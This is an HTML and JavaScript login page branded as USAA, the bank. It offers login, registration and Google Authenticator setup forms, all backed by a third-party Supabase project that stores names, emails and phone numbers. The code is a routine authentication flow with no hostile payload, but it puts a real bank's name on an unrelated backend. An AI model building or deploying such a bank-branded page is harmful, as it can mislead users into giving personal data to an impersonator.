<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>USAA - Access Your Account</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }

    body {
      background-color: #002649;
      color: #ffffff;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
    }

    .auth-card {
      background-color: #ffffff;
      color: #333333;
      width: 100%;
      max-width: 420px;
      border-radius: 16px;
      padding: 30px 25px;
      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
    }

    .brand-header {
      text-align: center;
      margin-bottom: 25px;
    }

    .brand-header i {
      font-size: 40px;
      color: #002649;
    }

    .brand-header h1 {
      font-size: 24px;
      font-weight: 700;
      color: #002649;
      margin-top: 8px;
    }

    .tabs {
      display: flex;
      border-bottom: 2px solid #e2e8f0;
      margin-bottom: 20px;
    }

    .tab-btn {
      flex: 1;
      padding: 12px;
      background: none;
      border: none;
      font-size: 16px;
      font-weight: 600;
      color: #64748b;
      cursor: pointer;
      text-align: center;
    }

    .tab-btn.active {
      color: #002649;
      border-bottom: 3px solid #002649;
    }

    .form-group {
      margin-bottom: 16px;
    }

    .form-group label {
      display: block;
      font-size: 13px;
      font-weight: 600;
      color: #475569;
      margin-bottom: 6px;
    }

    .form-group input {
      width: 100%;
      padding: 12px;
      border: 1px solid #cbd5e1;
      border-radius: 8px;
      font-size: 15px;
      outline: none;
      color: #333333;
    }

    .form-group input:focus {
      border-color: #002649;
    }

    .btn-submit {
      width: 100%;
      padding: 14px;
      background-color: #002649;
      color: #ffffff;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      margin-top: 10px;
    }

    .btn-submit:hover {
      background-color: #001a33;
    }

    .btn-submit:disabled {
      background-color: #94a3b8;
      cursor: not-allowed;
    }

    .btn-secondary {
      width: 100%;
      padding: 12px;
      background: white;
      color: #002649;
      border: 1px solid #cbd5e1;
      border-radius: 8px;
      font-size: 14px;
      font-weight: 600;
      cursor: pointer;
      margin-top: 10px;
    }

    .alert {
      padding: 12px;
      border-radius: 6px;
      font-size: 14px;
      margin-bottom: 15px;
      display: none;
      word-break: break-word;
    }

    .alert.error {
      background-color: #fee2e2;
      color: #991b1b;
      border: 1px solid #f87171;
      display: block;
    }

    .alert.success {
      background-color: #dcfce7;
      color: #166534;
      border: 1px solid #4ade80;
      display: block;
    }

    .otp-info {
      text-align: center;
      font-size: 14px;
      color: #475569;
      margin-bottom: 18px;
      line-height: 1.45;
    }

    #mfa-form, #enroll-form {
      display: none;
    }

    .qr-container {
      text-align: center;
      margin: 15px 0;
    }

    .qr-container img {
      max-width: 200px;
      border: 1px solid #e2e8f0;
      border-radius: 8px;
    }
  </style>
</head>
<body>

  <div class="auth-card">
    <div class="brand-header">
      <i class="fa-solid fa-building-columns"></i>
      <h1>USAA</h1>
    </div>

    <div class="tabs" id="tabs">
      <button id="login-tab" class="tab-btn active">Log In</button>
      <button id="register-tab" class="tab-btn">Register</button>
    </div>

    <div id="alert-box" class="alert"></div>

    <!-- LOGIN FORM -->
    <form id="login-form">
      <div class="form-group">
        <label>Email Address</label>
        <input type="email" id="login-email" placeholder="Enter your email" required />
      </div>
      <div class="form-group">
        <label>Password</label>
        <input type="password" id="login-password" placeholder="••••••••" required />
      </div>
      <button type="submit" class="btn-submit" id="login-btn">Log In</button>
    </form>

    <!-- MFA (Google Authenticator) FORM -->
    <form id="mfa-form">
      <div class="otp-info">
        Open <strong>Google Authenticator</strong> and enter the 6-digit code
      </div>
      <div class="form-group">
        <label>Authenticator Code</label>
        <input type="text" id="mfa-code" placeholder="000000" maxlength="6" inputmode="numeric" required 
               style="text-align:center; font-size:22px; letter-spacing:8px;" />
      </div>
      <button type="submit" class="btn-submit" id="mfa-btn">Verify & Login</button>
      <button type="button" class="btn-secondary" id="back-to-login">← Back to Login</button>
    </form>

    <!-- ENROLL FORM (First time setup) -->
    <form id="enroll-form">
      <div class="otp-info">
        Scan this QR code with <strong>Google Authenticator</strong>
      </div>
      <div class="qr-container" id="qr-container">
        <!-- QR will appear here -->
      </div>
      <div class="form-group">
        <label>Enter the 6-digit code from the app</label>
        <input type="text" id="enroll-code" placeholder="000000" maxlength="6" inputmode="numeric" required 
               style="text-align:center; font-size:22px; letter-spacing:8px;" />
      </div>
      <button type="submit" class="btn-submit" id="enroll-btn">Activate Authenticator</button>
    </form>

    <!-- REGISTRATION FORM -->
    <form id="register-form" style="display: none;">
      <div class="form-group">
        <label>Full Name</label>
        <input type="text" id="reg-name" placeholder="Sarah Jenkins" required />
      </div>
      <div class="form-group">
        <label>Email Address</label>
        <input type="email" id="reg-email" placeholder="sarah@example.com" required />
      </div>
      <div class="form-group">
        <label>Phone Number</label>
        <input type="tel" id="reg-phone" placeholder="+1 (555) 000-0000" required />
      </div>
      <div class="form-group">
        <label>Password</label>
        <input type="password" id="reg-password" placeholder="Create password" required />
      </div>
      <button type="submit" class="btn-submit" id="reg-btn">Create Account</button>
    </form>
  </div>

  <script type="module">
    import { createClient } from 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/+esm';

    const SUPABASE_URL = "https://hzajoriyzowufebetpzv.supabase.co";
    const SUPABASE_ANON_KEY = "sb_publishable_2VBan5zlHsacQ4fvsBiBPQ_78oaUVth";
    const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

    let currentFactorId = null;
    let currentChallengeId = null;

    const loginTab = document.getElementById('login-tab');
    const registerTab = document.getElementById('register-tab');
    const loginForm = document.getElementById('login-form');
    const registerForm = document.getElementById('register-form');
    const mfaForm = document.getElementById('mfa-form');
    const enrollForm = document.getElementById('enroll-form');
    const tabs = document.getElementById('tabs');

    function showAlert(msg, type = 'error') {
      const box = document.getElementById('alert-box');
      if (!msg) {
        box.style.display = 'none';
        return;
      }
      box.className = `alert ${type}`;
      box.innerText = msg;
      box.style.display = 'block';
    }

    function switchTab(tab) {
      showAlert('');
      mfaForm.style.display = 'none';
      enrollForm.style.display = 'none';
      tabs.style.display = 'flex';

      if (tab === 'login') {
        loginForm.style.display = 'block';
        registerForm.style.display = 'none';
        loginTab.classList.add('active');
        registerTab.classList.remove('active');
      } else {
        loginForm.style.display = 'none';
        registerForm.style.display = 'block';
        registerTab.classList.add('active');
        loginTab.classList.remove('active');
      }
    }

    loginTab.addEventListener('click', () => switchTab('login'));
    registerTab.addEventListener('click', () => switchTab('register'));
    document.getElementById('back-to-login').addEventListener('click', () => switchTab('login'));

    // ===================== LOGIN =====================
    loginForm.addEventListener('submit', async (e) => {
      e.preventDefault();
      const loginBtn = document.getElementById('login-btn');
      loginBtn.disabled = true;
      loginBtn.innerText = "Verifying...";
      showAlert('');

      const email = document.getElementById('login-email').value.trim();
      const password = document.getElementById('login-password').value;

      try {
        const { data, error } = await supabase.auth.signInWithPassword({
          email,
          password
        });

        if (error) throw error;

        // Check if user has MFA enabled
        const { data: factors, error: factorsError } = await supabase.auth.mfa.listFactors();
        if (factorsError) throw factorsError;

        const totpFactor = factors?.totp?.[0];

        if (totpFactor && totpFactor.status === 'verified') {
          // MFA is enabled → challenge the user
          currentFactorId = totpFactor.id;

          const { data: challenge, error: challengeError } = await supabase.auth.mfa.challenge({
            factorId: currentFactorId
          });

          if (challengeError) throw challengeError;
          currentChallengeId = challenge.id;

          // Show MFA form
          loginForm.style.display = 'none';
          tabs.style.display = 'none';
          mfaForm.style.display = 'block';
          showAlert('Enter the code from Google Authenticator', 'success');
        } else {
          // No MFA yet → force enrollment
          await startEnrollment();
        }

      } catch (err) {
        console.error(err);
        showAlert(err.message || "Invalid email or password", 'error');
      } finally {
        loginBtn.disabled = false;
        loginBtn.innerText = "Log In";
      }
    });

    // ===================== MFA VERIFY =====================
    mfaForm.addEventListener('submit', async (e) => {
      e.preventDefault();
      const mfaBtn = document.getElementById('mfa-btn');
      mfaBtn.disabled = true;
      mfaBtn.innerText = "Verifying...";
      showAlert('');

      const code = document.getElementById('mfa-code').value.trim();

      try {
        const { data, error } = await supabase.auth.mfa.verify({
          factorId: currentFactorId,
          challengeId: currentChallengeId,
          code: code
        });

        if (error) throw error;

        showAlert('Login successful! Redirecting...', 'success');
        setTimeout(() => {
          window.location.href = 'dashboard.html';
        }, 800);

      } catch (err) {
        console.error(err);
        showAlert(err.message || "Invalid authenticator code", 'error');
      } finally {
        mfaBtn.disabled = false;
        mfaBtn.innerText = "Verify & Login";
      }
    });

    // ===================== ENROLLMENT (First time) =====================
    async function startEnrollment() {
      try {
        const { data, error } = await supabase.auth.mfa.enroll({
          factorType: 'totp',
          friendlyName: 'USAA Authenticator'
        });

        if (error) throw error;

        currentFactorId = data.id;

        // Show QR code
        document.getElementById('qr-container').innerHTML = `
          <img src="${data.totp.qr_code}" alt="QR Code">
          <p style="font-size:12px;margin-top:8px;color:#64748b;">
            Or enter this code manually:<br>
            <strong>${data.totp.secret}</strong>
          </p>
        `;

        loginForm.style.display = 'none';
        tabs.style.display = 'none';
        enrollForm.style.display = 'block';
        showAlert('Scan the QR code with Google Authenticator', 'success');

      } catch (err) {
        console.error(err);
        showAlert(err.message || "Could not start authenticator setup", 'error');
      }
    }

    enrollForm.addEventListener('submit', async (e) => {
      e.preventDefault();
      const enrollBtn = document.getElementById('enroll-btn');
      enrollBtn.disabled = true;
      enrollBtn.innerText = "Activating...";
      showAlert('');

      const code = document.getElementById('enroll-code').value.trim();

      try {
        // First create a challenge
        const { data: challenge, error: challengeError } = await supabase.auth.mfa.challenge({
          factorId: currentFactorId
        });
        if (challengeError) throw challengeError;

        // Then verify
        const { data, error } = await supabase.auth.mfa.verify({
          factorId: currentFactorId,
          challengeId: challenge.id,
          code: code
        });

        if (error) throw error;

        showAlert('Google Authenticator activated successfully! Redirecting...', 'success');
        setTimeout(() => {
          window.location.href = 'dashboard.html';
        }, 1200);

      } catch (err) {
        console.error(err);
        showAlert(err.message || "Invalid code. Please try again.", 'error');
      } finally {
        enrollBtn.disabled = false;
        enrollBtn.innerText = "Activate Authenticator";
      }
    });

    // ===================== REGISTRATION =====================
    registerForm.addEventListener('submit', async (e) => {
      e.preventDefault();
      const regBtn = document.getElementById('reg-btn');
      regBtn.disabled = true;
      regBtn.innerText = "Creating Account...";
      showAlert('');

      const name = document.getElementById('reg-name').value.trim();
      const email = document.getElementById('reg-email').value.trim();
      const phone = document.getElementById('reg-phone').value.trim();
      const password = document.getElementById('reg-password').value;
      const username = email.split('@')[0] + Math.floor(Math.random() * 10000);

      try {
        const { data: authData, error: authError } = await supabase.auth.signUp({
          email,
          password,
          options: {
            data: {
              full_name: name,
              phone_number: phone,
              username: username
            }
          }
        });

        if (authError) throw authError;

        if (authData?.user) {
          await supabase.from('profiles').upsert({
            id: authData.user.id,
            full_name: name,
            username: username,
            phone_number: phone,
            email: email
          });
        }

        showAlert('Account created! Please log in and set up Google Authenticator.', 'success');
        registerForm.reset();
        setTimeout(() => switchTab('login'), 1800);

      } catch (err) {
        console.error(err);
        showAlert(err.message || "Could not register", 'error');
      } finally {
        regBtn.disabled = false;
        regBtn.innerText = "Create Account";
      }
    });
  </script>
</body>
</html>
